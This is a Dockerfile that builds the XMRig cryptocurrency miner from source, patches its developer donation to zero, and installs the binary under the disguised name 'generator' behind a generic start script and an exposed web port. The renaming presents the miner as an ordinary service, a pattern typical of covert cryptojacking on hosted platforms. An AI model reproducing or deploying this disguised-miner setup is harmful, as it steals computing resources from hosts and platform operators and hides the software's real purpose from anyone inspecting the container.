# /usr/local/bin/start.sh will start the service

# FROM registry.access.redhat.com/ubi8/ubi-minimal:latest
FROM quay.io/fedora/fedora:35-x86_64

ADD scripts/ /usr/local/bin/

RUN dnf install -y wget perl git make cmake gcc gcc-c++ libstdc++-static automake libtool autoconf && \
#    wget https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm && \
#    rpm -i epel-release-latest-8.noarch.rpm && \
    dnf clean all && \
    cd /tmp && \
    git clone https://github.com/xmrig/xmrig && \
    cd /tmp/xmrig

RUN sed -i -e 's/"donate-level": 1,/"donate-level": 0,/' /tmp/xmrig/src/core/config/Config_default.h && \
    sed -i -e 's/"donate-over-proxy": 1,/"donate-over-proxy": 0,/' /tmp/xmrig/src/core/config/Config_default.h && \
    sed -i -e 's/{ "donate-level",          1, nullptr, IConfig::DonateLevelKey        },/{ "donate-level",          0, nullptr, IConfig::DonateLevelKey        },/' /tmp/xmrig/src/core/config/Config_platform.h && \
    sed -i -e 's/{ "donate-over-proxy",     1, nullptr, IConfig::ProxyDonateKey        },/{ "donate-over-proxy",     0, nullptr, IConfig::ProxyDonateKey        },/' /tmp/xmrig/src/core/config/Config_platform.h

RUN mkdir /tmp/xmrig/build && \
    cd /tmp/xmrig/scripts && \
    /tmp/xmrig/scripts/build_deps.sh && \
    cd /tmp/xmrig/build && \
    cmake .. -DXMRIG_DEPS=scripts/deps && \
    make -j$(nproc) && \
    mv xmrig /usr/local/bin/generator && \ 
    # rm -rf /tmp/xmrig && \
    cd

EXPOSE 8080

# Start processes
CMD /usr/local/bin/start.sh
